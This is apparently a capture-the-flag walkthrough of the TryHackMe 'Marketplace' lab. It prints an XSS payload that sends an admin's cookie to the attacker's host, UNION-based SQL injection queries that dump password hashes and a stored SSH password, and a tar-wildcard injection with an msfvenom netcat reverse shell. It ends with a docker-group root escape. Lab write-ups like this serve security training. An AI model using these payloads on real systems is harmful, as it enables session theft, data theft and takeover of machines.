# 32 - The Marketplace (XSS and SQLi)

Room Link --> [https://tryhackme.com/room/marketplace](https://tryhackme.com/room/marketplace)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap -Pn -n -p- -T5 -sS -vv 10.10.52.238

# Outputs
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp    open  http    syn-ack nginx 1.19.2
32768/tcp open  http    syn-ack Node.js (Express middleware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{% endcode %}

#### Dirsearch Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
dirsearch -u http://10.10.52.238 -x 403 -w /usr/share/dirb/wordlists/common.txt -t 200

# outputs.
[11:21:23] 301 -  179B  - /images  ->  /images/
[11:21:29] 200 -  857B  - /Login
[11:21:29] 200 -  857B  - /login
[11:21:32] 302 -   28B  - /messages  ->  /login
[11:21:34] 302 -   28B  - /new  ->  /login
[11:21:51] 200 -   31B  - /robots.txt
[11:21:55] 200 -  667B  - /signup
[11:22:00] 301 -  189B  - /stylesheets  ->  /stylesheets/
[11:22:00] 402 -  189B  - /admin
```
{% endcode %}

Opening the webpage: there are 2 users: \[michael and jake].

<figure><img src=".gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>

Next i signed up for a new user account and logged in.

And we are in. I then tried to create a new listing and noticed that they have blocked uploading of files but don’t seem to sanitize any inputs. So I tried to inject XSS script to see if it works.

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*Wtws_BFgseh7pSRBp7ogmw.png" alt="" height="648" width="700"><figcaption></figcaption></figure>

And..

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*qgXhY8wa03GGTj-QC6Y-tw.png" alt="" height="597" width="700"><figcaption></figcaption></figure>

After this POC, I noticed that we can report the listing to admins via:



`10.10.103.223/report/<item_number>` - ie 10.10.102.223/report/4

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*EQty4Mm3on7rW12rEUgHnA.png" alt="" height="359" width="700"><figcaption></figcaption></figure>

And based on the hint..

<figure><img src="https://miro.medium.com/v2/resize:fit:341/1*VpYGbyPgp9Q7pjnViBl5fA.png" alt="" height="106" width="496"><figcaption><p>I guess we have to exploit this!</p></figcaption></figure>

From  [_**PayloadsAlltheThings**_](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)  we can use this payload:

{% code overflow="wrap" lineNumbers="true" %}
```bash
<script>document.location='http://10.18.88.214:4442/XSS/grabber.php?c='+document.cookie</script>
```
{% endcode %}

<figure><img src=".gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>

setup nc or python simple web server to listen for incoming connections.`nc -nvlp 4444` .

When we try to report the listing by going to the url: `http://10.10.52.238/report/6` , we get a new token .

<figure><img src=".gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>

We can view the content of this token via --> [https://jwt.io/](https://jwt.io/)

<figure><img src=".gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

The token belongs to the Michael user. We can replace our token with this one.

<figure><img src=".gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

We were not able to view the `/admin` dir before but we can now.

<figure><img src=".gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### User access

On clicking on any user there is a SQLI vulnerability.

<figure><img src=".gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>

#### SQLI

Testing for sql injection.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# number of columns is 4 here since [5] gives an error.
http://10.10.21.37/admin?user=2 ORDER BY 4 -- - 
```
{% endcode %}

<figure><img src=".gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# after hours of trial and error i was able to get it by using "-1" :(

# identify which column is text.
http://10.10.180.141/admin?user=-1 UNION SELECT @@version,NULL,NULL,NULL--
# The DB is mysql.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

```
# user of the db
http://10.10.180.141/admin?user=-1 UNION SELECT user(),NULL,NULL,NULL--
```

<figure><img src=".gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# DB name

# i got the payload from payloadallthethings.
http://10.10.180.141/admin?user=-1%20UNION%20SELECT%20NULL,gRoUp_cOncaT(0x7c,schema_name,0x7c),NULL,NULL%20fRoM%20information_schema.schemata--

# db name is: marketplace
```
{% endcode %}

<figure><img src=".gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# Table name from the DB name.
http://10.10.180.141/admin?user=-1%20UNION%20SELECT%20NULL,gRoUp_cOncaT(0x7c,table_name,0x7c),NULL,NULL%20fRoM%20information_schema.tables%20WHERE%20table_schema=%22marketplace%22--

# we have 3 tables in the marketplace db
|items|,|messages|,|users|
```
{% endcode %}

<figure><img src=".gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

Users should be where the credentials are, so lets check users Taable.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# columns in the [users] table.

http://10.10.180.141/admin?user=-1%20UNION%20SELECT%20NULL,gRoUp_cOncaT(0x7c,column_name,0x7c),NULL,NULL%20fRoM%20information_schema.columns%20WHERE%20table_name=%22users%22--

# there are 4 columns in the users Table.
 |id|,|username|,|password|,|isAdministrator| 
```
{% endcode %}

<figure><img src=".gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

Time to view everything.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# the entire creds in the user table.

http://10.10.180.141/admin?user=-1 UNION SELECT NULL,group_CONCAT(id,"~",username,"~",password),NULL,NULL fRoM users--

1~system~$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW,2~michael~$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q,3~jake~$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG,4~dking~$2b$10$03QES9tj0O6mQTN0hqLi1u17z//RnvQpeJs3nuGgop1wSJD9TWqmy
```
{% endcode %}

<figure><img src=".gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure>

SO the passwords were unable to be cracked, so we have to check other tables. Lets check the "messages" table.

{% code overflow="wrap" lineNumbers="true" %}
```
# columns in the [messages] Table.

http://10.10.180.141/admin?user=-1%20UNION%20SELECT%20NULL,gRoUp_cOncaT(0x7c,column_name,0x7c),NULL,NULL%20fRoM%20information_schema.columns%20WHERE%20table_name=%22messages%22--

# there are 5 columns here.
|id|,|user_from|,|user_to|,|message_content|,|is_read| 
```
{% endcode %}

<figure><img src=".gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```
# view all data in the [messages] table.
http://10.10.180.141/admin?user=-1%20UNION%20SELECT%20NULL,group_CONCAT(id,%22~%22,user_from,%22~%22,user_to,%22~%22,message_content),NULL,NULL%20fRoM%20messages--

# we got:
User 1~1~3~Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ,2~1~4~Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,3~1~4~Thank you for your report. We have been unable to review the listing at this time. Something may be blocking our ability to view it, such as alert boxes, which are blocked in our employee's browsers.,4~1~4~Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,5~1~4~Thank you for your report. We have reviewed the listing and found nothing that violates our rules.,6~1~4~Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines a 
```
{% endcode %}

<figure><img src=".gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

We can see "3" which is for column "user\_to" which is referring to "jake", his ssh password is there.

New creds --> `jake : @b_ENXkGYUCAv3zJ` .

<figure><img src=".gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to Michael

#### Tar wildcards Priv Esc exploitation \[\*]

`sudo -l` We can execute cmd as Michael.

<figure><img src=".gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>

When we cat the contents of the backup.sh script we see that "tar" is also utilizing a "\*" \[wildcard] character. We can use this [**website** ](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)which shows how to do privilege escalation base on tar wildcard!

First, we have to generate a NetCat reverse shell payload on our own machine.

`msfvenom -p cmd/unix/reverse_netcat lhost=AttackerIP lport=port R`

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*jfCKC7Ghb5v1HStZMdPTNA.png" alt="" height="65" width="700"><figcaption></figcaption></figure>

Now hop back onto Jake’s terminal as we have to inject the payload into a script for backup.tar to run.

`cd /opt/backups`\
`echo "MSFVENOM PAYLOAD" > shell.sh`\
`echo "" > "--checkpoint-action=exec=sh shell.sh"`\
`echo "" > --checkpoint=1`

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*fGibNrG-2JbgKakzIxGd0w.png" alt="" height="66" width="700"><figcaption></figcaption></figure>

Now open a NetCat listener on your machine with the port that you have specified on the payload. Once that is done, we need to change the permission of the files and run it!

`chmod 777 backup.tar shell.sh`\
`sudo -u michael /opt/backups/backup.sh`

<figure><img src="https://miro.medium.com/v2/resize:fit:439/1*mvURRH7gM81rbKZRplSwpA.png" alt="" height="95" width="639"><figcaption></figcaption></figure>

And you should get a shell on your listener!

<figure><img src="https://miro.medium.com/v2/resize:fit:346/1*1TdhxcYPa_u78hQvFNeRqg.png" alt="" height="122" width="503"><figcaption></figcaption></figure>

Michael is in the "docker" group, so check gtfobin for the payload.

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

<figure><img src=".gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

Done.

